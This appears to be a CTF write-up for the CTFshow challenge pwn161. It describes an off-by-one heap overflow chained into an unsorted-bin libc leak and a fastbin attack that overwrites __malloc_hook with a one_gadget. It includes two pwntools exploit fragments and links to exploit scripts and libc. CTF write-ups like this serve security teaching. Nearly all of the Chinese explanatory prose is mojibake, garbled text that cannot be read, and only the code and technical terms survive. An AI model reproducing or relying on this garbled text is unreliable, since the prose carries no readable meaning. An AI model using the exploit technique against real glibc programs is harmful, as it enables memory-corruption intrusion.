---
title: CTFshow pwn161 Off-by-One 鍒?__malloc_hook
published: 2026-04-17
updated: 2026-04-17
description: 鍒╃敤 edit 鐨勪竴瀛楄妭瓒婄晫鎶婄浉閭?chunk size 鏀瑰ぇ锛屽厛鍋?unsorted leak锛屽啀鎺?fastbin attack 鍛戒腑 __malloc_hook銆
tags: [CTFshow, Pwn, Heap, Off-by-One, Fastbin, Unsorted Bin]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

`pwn161` 鐨勬牳蹇冩槸涓€瀛楄妭鍫嗘孩鍑恒€?
閫氳繃 `edit` 鎶婄浉閭诲潡鐨?`size` 浠?`0x71` 鏀规垚鏇村ぇ鐨勫€硷紝灏辫兘鍒堕€?overlap銆傞殢鍚庡厛浠?unsorted bin 閲?leak libc锛屽啀鎶?fastbin fd 鏀瑰埌 `__malloc_hook - 0x23`锛屾渶鍚庡啓 one_gadget銆?
## 鍒╃敤閾?
1. 鐢宠澶氫釜 `0x68` chunk 鍋氬熀纭€甯冨眬
2. 鐢?off-by-one 鎶婄浉閭诲潡 size 鏀规垚 `0xe1`
3. `free` 鍚庝粠 unsorted bin 娉勯湶 libc
4. 鍐嶅仛涓€娆¤鐩栵紝鎶?chunk 淇垚 `0x71` 閲嶆柊杩涘叆 fastbin 閫昏緫
5. 鎶?fastbin fd 鏀瑰埌 `__malloc_hook - 0x23`
6. 鍐欏叆 `one_gadget + realloc`
7. 鍐嶆 `malloc` 瑙﹀彂

## 鍏抽敭 exp 鐗囨

```python
payload = p64(0) * 13 + p8(0xe1)
edit(0, 0x68 + 10, payload)
delete(1)
add(0x68)
show(2)
leak = u64(io.recv(6).ljust(8, b'\x00'))
```

```python
edit(4, 0x8, p64(malloc_hook - 0x23))
add(0x68)
add(0x68)
payload3 = b'a' * (0x13 - 8) + p64(one_gadget) + p64(realloc)
edit(5, len(payload3), payload3)
add(0x68)
```

## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn161/pwn)
- [涓嬭浇绋冲畾鐗堝埄鐢ㄨ剼鏈?`exp_remote.py`](../../attachments/ctfshow/pwn161/exp_remote.py)
- [涓嬭浇鐖嗙牬鐗堣剼鏈?`exp_brute.py`](../../attachments/ctfshow/pwn161/exp_brute.py)
- [涓嬭浇瀵瑰簲 libc `libc-2.23.so`](../../attachments/ctfshow/pwn161/libc-2.23.so)
- [涓嬭浇鍘熷绗旇 `pwn161.md`](../../attachments/ctfshow/pwn161/pwn161.md)

## 閫傚悎璁颁綇鐨勭偣

涓€瀛楄妭鍫嗘孩鍑烘渶甯歌鐨勭洰鏍囦笉鏄洿鎺ユ敼鎸囬拡锛岃€屾槸浼樺厛鏀圭浉閭?chunk 鐨?`size` 瀛楁锛岃 allocator 鑷繁鎶婂竷灞€閫佽繘浣犵殑鍒╃敤閾俱€?

